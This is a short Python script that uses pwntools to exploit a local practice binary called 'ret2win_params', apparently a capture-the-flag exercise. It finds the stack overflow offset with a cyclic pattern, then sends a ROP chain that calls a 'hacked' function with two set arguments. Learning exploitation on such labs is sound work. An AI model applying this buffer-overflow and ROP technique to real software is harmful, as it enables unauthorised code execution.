from pwn import *

def find_ip(payload):
    io=process(exe)
    io.sendlineafter(b':',payload)
    io.wait()
    rip_offset=cyclic_find(io.corefile.read(io.corefile.sp, 4))
    return rip_offset



exe='ret2win_params'

elf = context.binary = ELF(exe)

rop=ROP(elf)

rop.hacked(0xdeadbeefdeadbeef,0xc0debabec0debabe)

offset=find_ip(cyclic(200))


payload=flat(
    {
        offset:rop.chain()
    }
)

p=elf.process()

p.sendlineafter(b':',payload)

p.interactive()



